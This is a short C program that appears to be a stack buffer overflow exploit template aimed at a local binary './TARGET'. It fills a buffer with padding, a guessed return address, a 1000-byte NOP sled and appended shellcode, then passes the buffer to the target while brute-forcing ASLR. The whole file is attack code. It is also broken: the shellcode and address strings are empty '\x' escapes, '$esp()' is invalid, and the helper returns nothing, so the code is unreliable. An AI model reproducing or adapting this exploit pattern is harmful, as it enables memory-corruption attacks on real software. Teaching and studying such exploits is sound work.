#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

unsigned long esp(void)
{
        asm("movl %esp, %eax"); /* Inline asm prints %esp */
        asm("shr $4, %eax"); /* getting rid of al as it's static */
}

int main(void){

unsigned char scode[]= "\x\x\x\x\x\x";

char buffer[1651];
        printf("\n\nASLR ESP at 0x%x0\n", $esp());
        memset(buffer, 0x41, 612);
        strcat(buffer+612, "\x\x\x\x"); /* Our RP guess */
        memset(buffer+616, 0x90, 1000); /* 1000 byte NOP sled */
        memcpy(buffer+1616, scode, sizeof(scode)); /*Append Shellcode*/
        execl("./TARGET","aslr_brute", buffer, NULL); /*Pass in our data to target*/
        exit(0);
}
